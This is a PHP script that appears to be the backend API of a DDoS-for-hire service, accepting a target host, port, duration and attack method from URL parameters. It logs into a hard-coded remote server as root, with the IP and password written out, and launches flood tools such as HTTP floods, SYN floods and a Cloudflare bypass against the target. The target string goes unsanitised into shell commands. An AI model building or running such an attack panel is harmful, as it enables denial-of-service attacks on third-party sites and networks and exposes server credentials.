<?php

require('/var/www/html/Bin/xwaf.php');
$xWAF = new xWAF();
$xWAF->start(); 

// ð€ððˆ ð‚ð¨ð¥ð¨ð« ð‚ð¨ð§ðŸð¢ð 

require 'ShisuiUsers.php';
require 'ShisuiBlacklist.php';
require 'ShisuiFunctions.php';

$backgroundcolor="202020";
$textcolor="C474A0";
 
/*
 
ð“ð¡ðž ð’ð¡ð¢ð¬ð®ð¢ ðŽðŸðŸð¢ðœð¢ðšð¥ ð€ððˆ ðˆðˆ
ð°ðšð¬ ð¦ðšððž ðšð§ð ð«ðžð¯ðšð¦ð©ðžð ð›ð²
      ð‚ð¨ð§ð¬ðžð«ð¯ðšð­ð¢ð¯ðž
  ðð¥ðšðœð¤ð¨ð®ð­ ðšð§ð ð‡ð²ð§ð¢ð±!
 
*/

if ($backgroundcolor != NULL or $backgroundcolor != ""){
   $body="<body style='background:#$backgroundcolor;'></body>";
   $stat="#$backgroundcolor runs";
}
echo $body;

// First Server
 
$server_ip = "185.107.195.182";
$server_username = "root";
$server_password = "o9Fm9x5J2i";

// Second Server

// ð†ð„ð“ ð‘ðžðªð®ðžð¬ð­ð¬
 
$username = $_GET['username'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$type = $_GET['type'];
 
// ðŒðžð­ð¡ð¨ð ðšð«ð«ðšð² ð¥ð¢ð¬ð­. (ð•ðšð¥ð¢ð ðŒðžð­ð¡ð¨ðð¬)
 
$methods = array(
   "",
   "AKAME-RAW",
   "AKAME-HTTPS",
   "AKAME-AUTOBYPASS",
   "HTTP-KIA",
   "CF-LAG",
);
 
// ð“ð¡ð«ð¨ð°ð¬ ðžð«ð«ð¨ð« ð¨ð§ ð ð¢ð¯ðžð§ ðð¨ð¦ðšð¢ð§ ðžð±ð­ðžð§ð¬ð¢ð¨ð§!

function endFunc($str, $lastString) {
  $count = strlen($lastString);
  if ($count == 0) {
     return true;
  }
  return (substr($str, -$count) === $lastString);
}

if(endFunc($host,".gov")) // .GOV
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,".ca")) // .CA
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
if(endFunc($host,".edu")) // .EDU
  die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");

// ð„ð§ð ð¨ðŸ ð­ð¡ðž ðð¨ð¦ðšð¢ð§ ðœð¨ð§ðŸð¢ð .

if (in_array($username, $people)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Invalid username!</span>");}
 
if (in_array($host, $blacklisted))
 {
   die("<span style=color:#$textcolor;text-align:center;>Host is blacklisted!</span>");
 }
 
if ($port > 44405){
 die("<span style=color:#$textcolor;text-align:center;>Invalid port!</span>");}
 
if (!empty($time)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Invalid time!</span>");}
 
if (!empty($method)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Method is empty!</span>");}
if (in_array($method, $methods)){
 }else{
 die("<span style=color:#$textcolor;text-align:center;>Unknown method!</span>");}
       
if ($time > 300){
 die("<span style=color:#$textcolor;text-align:center;>Maximum time exceeded!</span>");}
if(ctype_digit($Time)){
 die("<span style=color:#$textcolor;text-align:center;>Time must be in numbers!</span>");}
 
if(ctype_digit($Port)){
 die("<span style=color:#$textcolor;text-align:center;>Port must be in numbers!</span>");}

// ð‘ðžðªð®ðžð¬ð­ ð­ð¡ðž ð°ðžð›ð¡ð¨ð¨ð¤!

 if (isset($username, $host, $port, $time, $method)) {

  SendWebhook();

}
// ðˆð§ð©ð®ð­ ðœð¨ð¦ð¦ðšð§ðð¬
 
if ($method == "AKAME-RAW") { $command = "screen -dm timeout $time perl HTTP-KILL $host 55 100 proxies.txt"; }
if ($method == "AKAME-HTTPS") { $command = "screen -dm node website-nuker-proxied.js $host $time"; }
if ($method == "AKAME-AUTOBYPASS") { $command = "screen -dm ./v8 $host $time auto 15"; }
if ($method == "HTTP-KIA") { $command = "screen -dm perl http.pl $host 50000 $time 8.8.8.8 node HTTP-RAW.js $host $time"; }
if ($method == "CF-LAG") { $command = "screen -dm python3 cf.PY $host 50000 $time"; }
if ($method == "GAME-SERVER") { $command = "screen -dm ./GAME-SERVER $host 10 -1 $time"; }
if ($method == "GRENADE") { $command = "screen -dm ./GRENADE $host $port 10 -1 $time"; }
if ($method == "KILLALL") { $command = "screen -dm ./KILLALL $host $port 10 -1 $time ack"; }
if ($method == "SSYN-V2") { $command = "screen -dm ./SSYN-V2 $host $port 10 $time"; }
if ($method == "STCP") { $command = "screen -dm ./STCP $host $port 10 -1 $time ack"; }
if ($method == "") { $command = ""; }
 
// ð’ð­ð¨ð© ðœð¨ð¦ð¦ðšð§ð
 
if ($method == "stop") { $command = "pkill $host -f"; }

// ðƒð¨ð§'ð­ ð¦ðžð¬ð¬ ð°ð¢ð­ð¡ ð­ð¡ðžð¬ðž ð¬ðžð­ð­ð¢ð§ð ð¬ ð©ð¥ðžðšð¬ðž
 
if (!function_exists("ssh2_connect")) die("<span style=color:#$textcolor;text-align:center;>Install SSH2!</span>");
if(!($con = ssh2_connect($server_ip, 22))){
 echo "<span style=color:#$textcolor;text-align:center;>Failure to open on port 22!</span>";
} else {
 // ð‹ð¨ð ð ð¢ð§ð  ð¢ð§...
 
   if(!ssh2_auth_password($con, $server_username, $server_password)) {
       echo "<span style=color:#$textcolor;text-align:center;>Server config is wrong!</span>";
   } else {
     
     // ð€ð­ð­ðžð¦ð©ð­ð¢ð§ð  ð­ð¨ ð¬ðžð§ð ð­ð¡ðž ðšð­ð­ðšðœð¤...
        if (!($stream = ssh2_exec($con, $command ))) {
           echo "<span style=color:#$textcolor;text-align:center;>Attack failure!</span>";
       } else { 
 
         // ð€ð­ð­ðšðœð¤ ð¬ðžð§ð­!
        
           stream_set_blocking($stream, false);
           $data = "";
           while ($buf = fread($stream,4096)) {
               $data .= $buf;
           }
                       echo "<span style=color:#$textcolor;text-align:center;>Attack sent to $host on port $port for $time seconds using $method using ODST SERVER 1</span>";
           fclose($stream);
       }
   }

   }
?>
 

